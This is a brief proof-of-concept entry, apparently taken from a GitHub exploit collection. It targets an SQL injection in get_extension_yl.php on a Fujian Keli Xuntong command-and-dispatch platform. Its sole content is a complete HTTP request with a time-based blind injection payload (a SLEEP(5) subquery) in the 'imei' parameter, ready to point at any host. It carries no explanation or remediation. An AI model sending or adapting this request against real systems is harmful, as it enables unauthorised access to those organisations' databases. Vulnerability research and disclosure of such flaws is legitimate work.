# zhdd_get_extension_yl_sqli

from: https://github.com/wy876/POC/blob/main/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E5%B9%B3%E5%8F%B0get_extension_yl.php%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
2024.3.25 @2
```
GET /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(5)))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1 HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: authcode=h8g9
Upgrade-Insecure-Requests: 1
```
